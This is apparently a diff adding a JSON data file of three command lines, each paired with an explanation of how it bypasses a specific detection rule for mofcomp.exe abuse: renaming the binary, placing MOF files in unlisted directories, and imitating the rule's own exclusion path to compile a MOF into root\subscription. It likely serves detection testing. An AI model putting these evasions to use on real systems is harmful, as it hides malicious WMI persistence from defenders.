@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\wbem\\mofcomp.exe C:\\Windows\\Tasks\\not_mof.exe && C:\\Windows\\Tasks\\not_mof.exe C:\\Windows\\Tasks\\malicious.mof",
+    "explanation": "This bypasses the 'selection_img' logic. The rule looks specifically for an Image path ending in '\\mofcomp.exe' or the OriginalFileName. By renaming the binary and executing it from a non-suspicious directory (C:\\Windows\\Tasks\\ instead of Users\\Public\\ or Temp\\), it avoids the specific CommandLine string matches and the Image name check."
+  },
+  {
+    "output": "Start-Process mofcomp.exe -ArgumentList \"C:\\ProgramData\\legit.mof\"",
+    "explanation": "This bypasses the 'selection_case' CommandLine filters. The rule triggers if the command line contains specific temporary or public paths (like \\AppData\\Local\\Temp or \\Users\\Public\\). By placing the MOF file in C:\\ProgramData\\ or another common directory not explicitly listed in the 'CommandLine|contains' section, the 'all of selection_*' condition fails."
+  },
+  {
+    "output": "C:\\Windows\\System32\\wbem\\mofcomp.exe -N:root\\subscription C:\\Windows\\TEMP\\evasion.mof",
+    "explanation": "This targets the 'filter_optional_null_parent' and 'filter_main_wmiprvse' exclusion logic. The rule explicitly ignores executions where the command line contains 'C:\\Windows\\TEMP\\' and ends with '.mof' to reduce false positives from WMI Provider Host. By mimicking this specific pathing and ensuring the command ends in '.mof', the execution is filtered out of the alert results."
+  }
+]
